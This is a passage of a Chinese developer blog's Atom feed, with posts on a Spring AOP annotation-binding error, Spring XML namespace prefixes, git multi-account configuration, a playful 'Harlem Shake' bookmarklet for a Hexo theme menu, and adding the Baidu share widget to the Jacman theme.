    <id>http://yeshaoting.cn/article/spring/%E6%B3%A8%E8%A7%A3%E5%88%87%E9%9D%A2%E7%BC%BA%E5%B0%91%E6%B3%A8%E8%A7%A3%E5%8F%82%E6%95%B0/</id>
    <published>2016-02-28T05:54:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><p>针对注解Retry进行切面处理，报<strong>error at –0 formal unbound in pointcut</strong>异常。</p><p>因为传递给aroundAdvice切面方法缺少注解参数。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(value = &quot;point()&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aroundAdvice</span><span class="params">(ProceedingJoinPoint joinPoint, Retry retry)</span> <span class="keyword">throws</span> Throwable</span></span><br></pre></td></tr></table></figure><p><strong>正确样例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(value = &quot;point() &amp;&amp; @annotation(retry)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aroundAdvice</span><span class="params">(ProceedingJoinPoint joinPoint, Retry retry)</span> <span class="keyword">throws</span> Throwable</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;p&gt;针对注解Retry进行切面处理，报&lt;strong&gt;error at –0 formal unbound in pointcu</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
    <category term="aop" scheme="http://yeshaoting.cn/tags/aop/"/>
    
  </entry>
  
  <entry>
    <title>spring容器标签前缀</title>
    <link href="http://yeshaoting.cn/article/spring/spring%E5%AE%B9%E5%99%A8%E6%A0%87%E7%AD%BE%E5%89%8D%E7%BC%80/"/>
    <id>http://yeshaoting.cn/article/spring/spring%E5%AE%B9%E5%99%A8%E6%A0%87%E7%AD%BE%E5%89%8D%E7%BC%80/</id>
    <published>2016-02-28T05:53:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/spring.png" class="img-logo img-center" /><p>一般地，spring容器标签bean元数据格式为<code>&lt;bean&gt;&lt;/bean&gt;</code>。但是，奇怪的是有的时候必须使用<code>&lt;beans:bean&gt;&lt;/beans:bean&gt;</code>，否则会报错。</p><h2 id="一、为什么会这样？"><a href="#一、为什么会这样？" class="headerlink" title="一、为什么会这样？"></a>一、为什么会这样？</h2><p>这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。<br>由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。</p><p>例如：spring <strong>tx</strong> schema包含annotation-driven(<code>&lt;tx:annotation-driven/&gt;</code>)，同时，spring mvc schema也包含annotation-driven(<code>&lt;mvc:annotation-driven/&gt;</code>)</p><h2 id="二、小结"><a href="#二、小结" class="headerlink" title="二、小结"></a>二、小结</h2><p>对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:beans</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而对于需要使用beans前缀的，xmlns被修改了，可能是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:beans</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>由此可知</strong>：</p><blockquote><p>使用主命名空间里的标签，命名空间前缀并不是必须的。</p></blockquote><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><p><a href="http://bbs.csdn.net/topics/340026084">http://bbs.csdn.net/topics/340026084</a><br><a href="http://www.w3school.com.cn/tags/tag_prop_xmlns.asp">http://www.w3school.com.cn/tags/tag_prop_xmlns.asp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/spring.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;一般地，spring容器标签bean元数据格式为&lt;code&gt;&amp;lt;bean&amp;gt;&amp;lt;/bean&amp;gt;&lt;/code</summary>
      
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
    <category term="spring" scheme="http://yeshaoting.cn/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>git多仓库配置</title>
    <link href="http://yeshaoting.cn/article/git/git%E5%A4%9A%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
    <id>http://yeshaoting.cn/article/git/git%E5%A4%9A%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE/</id>
    <published>2016-02-18T04:32:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/git.png" class="img-logo img-center" /><h2 id="一、密钥选择"><a href="#一、密钥选择" class="headerlink" title="一、密钥选择"></a>一、密钥选择</h2><p>默认情况下，git会使用id_rsa与id_rsa.pub的密钥对，与git代码服务器进行通信。但是，对于同一台机器需要与不同的git代码服务器进行通信的需求，则需要进行特别指定。</p><p>例如：需要针对于github使用非默认的密钥对，则可向~/.ssh/config添加如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile /Users/yeshaoting/.ssh/id_rsa_github</span><br></pre></td></tr></table></figure><h2 id="二、用户配置"><a href="#二、用户配置" class="headerlink" title="二、用户配置"></a>二、用户配置</h2><p>代码提交的用户信息。</p><h3 id="1-全局配置"><a href="#1-全局配置" class="headerlink" title="1. 全局配置"></a>1. 全局配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;叶绍亭&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;yeshaoting@meituan.com&quot;</span></span><br></pre></td></tr></table></figure><p>会在用户目录生成或修改~/.gitconfig文件。<br>默认情况下，会使用此文件里的配置内容。</p><h3 id="2-仓库配置"><a href="#2-仓库配置" class="headerlink" title="2. 仓库配置"></a>2. 仓库配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name <span class="string">&quot;yeshaoting&quot;</span></span><br><span class="line">git config user.email <span class="string">&quot;yeshaoting@163.com&quot;</span></span><br></pre></td></tr></table></figure><p>会修改当前仓库.git/config文件内容。<br>此文件里的配置会覆盖全局配置里相同的配置内容。</p><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><ul><li><a href="https://git-scm.com/book/zh/v1/%E8%B5%B7%E6%AD%A5-%E5%88%9D%E6%AC%A1%E8%BF%90%E8%A1%8C-Git-%E5%89%8D%E7%9A%84%E9%85%8D%E7%BD%AE">1.5 起步 - 初次运行 Git 前的配置</a></li><li><a href="https://orrsella.com/2013/08/10/git-using-different-user-emails-for-different-repositories/">Git: Using Different User Emails for Different Repositories</a></li><li><a href="http://dereenigne.org/git/set-git-email-address-on-a-per-repository-basis">Set git email address on a per repository basis</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/git.png&quot; class=&quot;img-logo img-center&quot; /&gt;



&lt;h2 id=&quot;一、密钥选择&quot;&gt;&lt;a href=&quot;#一、密钥选择&quot; class=&quot;headerlink&quot; title=&quot;一、密钥选择</summary>
      
    
    
    
    <category term="版本控制" scheme="http://yeshaoting.cn/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"/>
    
    
    <category term="git" scheme="http://yeshaoting.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>High一下</title>
    <link href="http://yeshaoting.cn/article/hexo/High%E4%B8%80%E4%B8%8B/"/>
    <id>http://yeshaoting.cn/article/hexo/High%E4%B8%80%E4%B8%8B/</id>
    <published>2016-02-16T10:06:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/blog.png" title="hexo" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p><p>让网站元素动起来，从<a href="http://coolshell.cn/">酷壳</a>网站抄过来的，套到hexo博客菜单里。</p><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><p>代码：themes/jacman/layout/_partial/header.ejs</p><p>找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">title</span>=<span class="string">&quot;把这个链接拖到你的Chrome收藏夹工具栏中&quot;</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:(function()&#123;function c()&#123;var e=document.createElement(&quot;link&quot;);e.setAttribute(&quot;type&quot;,&quot;text/css&quot;);e.setAt    tribute(&quot;rel&quot;,&quot;stylesheet&quot;);e.setAttribute(&quot;href&quot;,f);e.setAttribute(&quot;class&quot;,l);document.body.appendChild(e)&#125;function h()&#123;var e=document.getElementsByClassName(l);for(var t=0;t&lt;e.length;t++)&#123;document    .body.removeChild(e[t])&#125;&#125;function p()&#123;var e=document.createElement(&quot;div&quot;);e.setAttribute(&quot;class&quot;,a);document.body.appendChild(e);setTimeout(function()&#123;document.body.removeChild(e)&#125;,100)&#125;function d(e    )&#123;return&#123;height:e.offsetHeight,width:e.offsetWidth&#125;&#125;function v(i)&#123;var s=d(i);return s.height&gt;e<span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span>s.height&lt;n<span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span>s.width&gt;t<span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span>s.width&lt;r&#125;function m(e)&#123;var t=e;var n=0;while(!!t)&#123;n+=t    .offsetTop;t=t.offsetParent&#125;return n&#125;function g()&#123;var e=document.documentElement;if(!!window.innerWidth)&#123;return window.innerHeight&#125;else if(e<span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span>!isNaN(e.clientHeight))&#123;return e.clientHeight&#125;re    turn 0&#125;function y()&#123;if(window.pageYOffset)&#123;return window.pageYOffset&#125;return Math.max(document.documentElement.scrollTop,document.body.scrollTop)&#125;function E(e)&#123;var t=m(e);return t&gt;=w<span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span>t&lt;=b+w&#125;    function S()&#123;var e=document.createElement(&quot;audio&quot;);e.setAttribute(&quot;class&quot;,l);e.src=i;e.loop=false;e.addEventListener(&quot;canplay&quot;,function()&#123;setTimeout(function()&#123;x(k)&#125;,500);setTimeout(function()&#123;N();p    ();for(var e=0;e&lt;O.length;e++)&#123;T(O[e])&#125;&#125;,15500)&#125;,true);e.addEventListener(&quot;ended&quot;,function()&#123;N();h()&#125;,true);e.innerHTML=&quot; &lt;p&gt;If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.&lt;/p&gt; &lt;p&gt;&quot;;document.body.appendChild(e);e.play()&#125;function x(e)&#123;e.className+=&quot; &quot;+s+&quot; &quot;+o&#125;function T(e)&#123;e.className+=&quot; &quot;+s+&quot; &quot;+u[Math.floor(Math.r    andom()*u.length)]&#125;function N()&#123;var e=document.getElementsByClassName(s);var t=new RegExp(&quot;\\b&quot;+s+&quot;\\b&quot;);for(var n=0;n&lt;e.length;)&#123;e[n].className=e[n].className.replace(t,&quot;&quot;)&#125;&#125;var e=30;var t=30;var n    =350;var r=350;var i=&quot;//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3&quot;;var s=&quot;mw-harlem_shake_me&quot;;var o=&quot;im_first&quot;;var u=[&quot;im_drunk&quot;,&quot;im_baked&quot;,&quot;im_trippin&quot;,&quot;im_blown&quot;];var a=&quot;mw-st    robe_light&quot;;var f=&quot;//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css&quot;;var l=&quot;mw_added_css&quot;;var b=g();var w=y();var C=document.getElementsByTagName(&quot;*&quot;);var k=null;for(var L=0;L&lt;    C.length;L++)&#123;var A=C[L];if(v(A))&#123;if(E(A))&#123;k=A;break&#125;&#125;&#125;if(A===null)&#123;console.warn(&quot;Could not find a node of the right size. Please try a different page.&quot;);return&#125;c();S();var O=[];for(var L=0;L&lt;C.leng    th;L++)&#123;var A=C[L];if(v(A))&#123;O.push(A)&#125;&#125;&#125;)()&#x27;</span>&gt;</span>High一下!<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/blog.png&quot; title=&quot;hexo&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>jacman主题集成百度分享</title>
    <link href="http://yeshaoting.cn/article/hexo/jacman%E4%B8%BB%E9%A2%98%E9%9B%86%E6%88%90%E7%99%BE%E5%BA%A6%E5%88%86%E4%BA%AB/"/>
    <id>http://yeshaoting.cn/article/hexo/jacman%E4%B8%BB%E9%A2%98%E9%9B%86%E6%88%90%E7%99%BE%E5%BA%A6%E5%88%86%E4%BA%AB/</id>
    <published>2016-02-16T08:53:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/hexo.png" title="hexo" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p><h3 id="1-默认分享样式"><a href="#1-默认分享样式" class="headerlink" title="1. 默认分享样式"></a>1. 默认分享样式</h3><p>默认分享样式如下图所示：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png" alt="默认分享"></p><h3 id="2-代码位置"><a href="#2-代码位置" class="headerlink" title="2. 代码位置"></a>2. 代码位置</h3><p>分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs<br>代码块：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-share&quot;</span> <span class="attr">id</span>=<span class="string">&quot;share&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二、集成百度分享"><a href="#二、集成百度分享" class="headerlink" title="二、集成百度分享"></a>二、集成百度分享</h2><p>jacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：</p><h3 id="1-登录或注册百度"><a href="#1-登录或注册百度" class="headerlink" title="1. 登录或注册百度"></a>1. 登录或注册百度</h3><p>登录<a href="http://share.baidu.com/">百度分享</a>，完成登录或注册。</p><h3 id="2-主题配置"><a href="#2-主题配置" class="headerlink" title="2. 主题配置"></a>2. 主题配置</h3><p>修改主题配置文件themes/jacman/_config.yml，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdshare:</span><br><span class="line">  enable: true ## if you use baidu share as your share tool,the built-in share tool won&#x27;t be display.</span><br></pre></td></tr></table></figure><p><strong>注</strong>：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。</p><h3 id="3-代码逻辑"><a href="#3-代码逻辑" class="headerlink" title="3. 代码逻辑"></a>3. 代码逻辑</h3><p>代码：themes/jacman/layout/_partial/post/footer.ejs</p><p>百度分享相关代码逻辑：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-share&quot;</span> <span class="attr">id</span>=<span class="string">&quot;share&quot;</span>&gt;</span></span><br><span class="line">    &lt;% if(theme.bdshare.enable)&#123; %&gt;</span><br><span class="line">      &lt;%- partial(&#x27;bdshare&#x27;) %&gt;</span><br><span class="line">    &lt;% &#125; else &#123; %&gt;</span><br><span class="line">        &lt;% if(theme.jiathis.enable)&#123; %&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;share-jiathis&quot;</span>&gt;</span></span><br><span class="line">          &lt;%- partial(&#x27;jiathis&#x27;) %&gt;</span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &lt;% &#125; else &#123; %&gt;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">data-url</span>=<span class="string">&quot;&lt;%- item.permalink %&gt;&quot;</span> <span class="attr">data-title</span>=<span class="string">&quot;&lt;% if (item.title)&#123; %&gt;&lt;%= item.title %&gt; | &lt;% &#125; %&gt;&lt;%= config.title %&gt;&quot;</span> <span class="attr">data-tsina</span>=<span class="string">&quot;&lt;%= theme.author.tsina %&gt;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;share clearfix&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。</p><p><strong>注</strong>：<code>&lt;%- partial(&#39;bdshare&#39;) %&gt;</code>语法表示加载当前目录下的bdshare.ejs文件。</p><h3 id="4-百度分享模块"><a href="#4-百度分享模块" class="headerlink" title="4. 百度分享模块"></a>4. 百度分享模块</h3><p>代码：themes/jacman/layout/_partial/post/bdshare.ejs</p><p>新建bdshare.ejs，并复制如下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.bdshare.enable)&#123; %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bdsharebuttonbox&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_more&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;more&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_sqq&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;sqq&quot;</span> <span class="attr">title</span>=<span class="string">&quot;分享到QQ好友&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_qzone&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;qzone&quot;</span> <span class="attr">title</span>=<span class="string">&quot;分享到QQ空间&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_weixin&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;weixin&quot;</span> <span class="attr">title</span>=<span class="string">&quot;分享到微信&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_tsina&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;tsina&quot;</span> <span class="attr">title</span>=<span class="string">&quot;分享到新浪微博&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_renren&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;renren&quot;</span> <span class="attr">title</span>=<span class="string">&quot;分享到人人网&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bds_count&quot;</span> <span class="attr">data-cmd</span>=<span class="string">&quot;count&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>._bd_share_config=&#123;<span class="string">&quot;common&quot;</span>:&#123;<span class="string">&quot;bdSnsKey&quot;</span>:&#123;&#125;,<span class="string">&quot;bdText&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;bdMini&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;bdMiniList&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;bdPic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;bdStyle&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;bdSize&quot;</span>:<span class="string">&quot;24&quot;</span>&#125;,<span class="string">&quot;share&quot;</span>:&#123;&#125;&#125;;<span class="keyword">with</span>(<span class="built_in">document</span>)<span class="number">0</span>[(getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>]||body).appendChild(createElement(<span class="string">&#x27;script&#x27;</span>)).src=<span class="string">&#x27;http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=&#x27;</span>+~(-<span class="keyword">new</span> <span class="built_in">Date</span>()/<span class="number">36e5</span>)];</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h3 id="5-检测分享代码版本"><a href="#5-检测分享代码版本" class="headerlink" title="5. 检测分享代码版本"></a>5. 检测分享代码版本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开已安装分享代码的页面，在控制台中执行：</span></span><br><span class="line"><span class="attr">javascript</span>:b=(<span class="built_in">window</span>.bdShare||<span class="built_in">window</span>._bd_share_main);alert(b?<span class="string">&#x27;\u5F53\u524D\u9875\u9762\u7684\u5206\u4EAB\u4EE3\u7801\u7248\u672C\u4E3A\uFF1A&#x27;</span>+(b.version||<span class="string">&#x27;1.0&#x27;</span>):<span class="string">&#x27;\u5F53\u524D\u9875\u9762\u6CA1\u6709\u5B89\u88C5\u5206\u4EAB\u4EE3\u7801\u3002&#x27;</span>)</span><br></pre></td></tr></table></figure><p>参见：<a href="http://share.baidu.com/code/advance#tools">检测分享代码版本</a></p><h2 id="三、分享效果展示"><a href="#三、分享效果展示" class="headerlink" title="三、分享效果展示"></a>三、分享效果展示</h2><p>分享按钮样式：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png" alt="jiathis分享"></p><p>内容分享给QQ好友：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png" alt="分享给QQ好友"></p><p>内容分享到微博：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png" alt="分享到微博"></p><h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><p>百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。<br>内容分享描述比较简单，仅仅只支持标题是硬伤。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/hexo.png&quot; title=&quot;hexo&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
    <category term="分享代码" scheme="http://yeshaoting.cn/tags/%E5%88%86%E4%BA%AB%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>jacman主题开启jiathis分享</title>
    <link href="http://yeshaoting.cn/article/hexo/jacman%E4%B8%BB%E9%A2%98%E5%BC%80%E5%90%AFjiathis%E5%88%86%E4%BA%AB/"/>
    <id>http://yeshaoting.cn/article/hexo/jacman%E4%B8%BB%E9%A2%98%E5%BC%80%E5%90%AFjiathis%E5%88%86%E4%BA%AB/</id>
    <published>2016-02-16T07:45:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/hexo.png" title="hexo" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p><h3 id="1-默认分享样式"><a href="#1-默认分享样式" class="headerlink" title="1. 默认分享样式"></a>1. 默认分享样式</h3><p>默认分享样式如下图所示：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png" alt="默认分享"></p><h3 id="2-代码位置"><a href="#2-代码位置" class="headerlink" title="2. 代码位置"></a>2. 代码位置</h3><p>分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs<br>代码块：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article-share&quot;</span> <span class="attr">id</span>=<span class="string">&quot;share&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二、开启jiathis分享"><a href="#二、开启jiathis分享" class="headerlink" title="二、开启jiathis分享"></a>二、开启jiathis分享</h2><p>jacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：</p><h3 id="1-注册jiathis"><a href="#1-注册jiathis" class="headerlink" title="1. 注册jiathis"></a>1. 注册jiathis</h3><p>登录<a 